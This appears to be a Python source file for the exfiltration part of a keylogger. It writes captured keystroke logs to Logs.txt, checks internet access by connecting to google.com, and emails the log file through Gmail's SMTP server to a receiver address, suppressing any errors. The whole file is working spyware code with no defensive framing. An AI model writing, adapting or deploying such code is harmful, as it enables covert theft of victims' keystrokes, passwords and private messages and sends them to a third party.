import smtplib,socket
from email.message import EmailMessage
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart


def createFile(Logs):
    """
    Creates Logs.txt file
    :param Logs: List of logs
    """
    file = open("Logs.txt", "w")
    for log in Logs: #iterate through Logs to write string to file
        if log == 'enter ': #if log is enter signifies new line so writes a new line to file with log
            file.write(log + '\n')
            continue
        file.write(log)
    file.close() #close file

def try_email():
    """
    Tries to connect to google to establish that there is internet
    :return: emailFailed boolean that indicates if connection happened
    """
    emailFailed = False
    try:
        request = b"GET / HTTP/1.1\nHost: www.google.com\n\n"
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #create socket
        s.settimeout(2)
        s.connect(("www.google.com",80)) #attempt to connect to google
        s.send(request)
    except socket.error:
           emailFailed = True #if there is an error will mark it as failed
    return emailFailed

def get_msg():
    """
    Uses mime to set payload of email
    :return: message as string
    """
    outer = MIMEMultipart()
    with open("Logs.txt","rb") as fp:
            msg = MIMEBase('application', "octet-stream")
            msg.set_payload(fp.read()) #read Logs.txt file
    fp.close()
    msg.add_header('Content-Disposition', 'attachment', filename="Logs.txt")
    outer.attach(msg) #attach msg
    return msg.as_string()

def send_email(user,passwd,receiver,emailFailed):
    """
    Attempts to send email
    :param user: gmail sending Logs
    :param passwd: password for that gmail
    :param receiver: receiver email of logs
    :param emailFailed: boolean indicating whether you can send email
    """
    if emailFailed is False:
        try:
            msg = EmailMessage()
            with open("Logs.txt") as fp:
                msg.set_content(fp.read()) #set content of email to content of Logs.txt
            fp.close() #close file
            mail = smtplib.SMTP("smtp.gmail.com",587) #using smtp protocol create connection
            mail.ehlo()
            mail.starttls()
            mail.login(user,passwd) #attempt to login
            mail.sendmail(user,receiver,get_msg()) #send mail
            mail.close()
        except EOFError or smtplib.SMTPException:
                pass #if error just pass
